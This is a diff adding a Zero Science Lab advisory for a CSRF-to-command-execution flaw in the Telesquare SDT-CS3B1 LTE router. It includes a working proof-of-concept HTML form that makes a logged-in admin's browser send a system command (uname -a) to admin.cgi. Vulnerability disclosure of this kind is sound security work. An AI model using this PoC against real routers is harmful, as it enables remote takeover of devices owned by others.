@@ -1,0 +1,55 @@
+Telesquare SKT LTE Router SDT-CS3B1 CSRF System Command Execution
+
+
+Vendor: Telesquare Co., Ltd.
+Product web page: http://www.telesquare.co.kr
+Affected version: FwVer: SDT-CS3B1, sw version 1.2.0
+                  LteVer: ML300S5XEA41_090  1 0.1.0
+                  Modem model: PM-L300S
+
+Summary: We introduce SDT-CS3B1 LTE router which is a SKT 3G and 4G
+LTE wireless communication based LTE router product.
+
+Desc: The router suffers from authenticated arbitrary system command
+execution. The application interface allows users to perform certain
+actions via HTTP requests without performing any validity checks to
+verify the requests. This can be exploited to perform certain actions
+with administrative privileges if a logged-in user visits a malicious
+web site.
+
+Tested on: lighttpd/1.4.20
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5443
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5443.php
+
+
+22.12.2017
+
+--
+
+
+IDOR for system command interface:
+----------------------------------
+
+GET /admin/system_command.shtml HTTP/1.1
+
+
+
+PoC GET CSRF request:
+---------------------
+
+<html>
+  <body>
+    <form action="http://10.0.0.17:8081/cgi-bin/admin.cgi">
+      <input type="hidden" name="Command" value="sysCommand" />
+      <input type="hidden" name="Cmd" value="uname%20-a" />
+      <input type="hidden" name="T" value="8168008531337" />
+      <input type="submit" value="Send" />
+    </form>
+  </body>
+</html>
